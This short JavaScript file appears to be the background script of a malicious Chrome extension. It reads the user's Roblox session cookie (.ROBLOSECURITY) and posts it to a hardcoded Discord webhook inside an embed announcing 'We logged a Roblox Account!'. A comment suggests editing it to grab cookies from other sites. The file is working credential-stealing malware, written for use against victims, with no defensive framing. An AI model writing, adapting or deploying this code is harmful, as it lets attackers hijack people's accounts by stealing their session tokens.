function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `We logged a Roblox Account!`,
            "description": ">>>We logged someone; see information about the user below",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(https://discordapp.com/api/webhooks/1267744701532999761/teLoxdH5hVh1bu_eHm-7StsnJdL2httEUM4EPcyfatSCK2f7rfcgBqTCu9OxbLX-mQ0v, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; // wanna grab other info from other sites? change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("Webhook", cookie.value);
  }
});
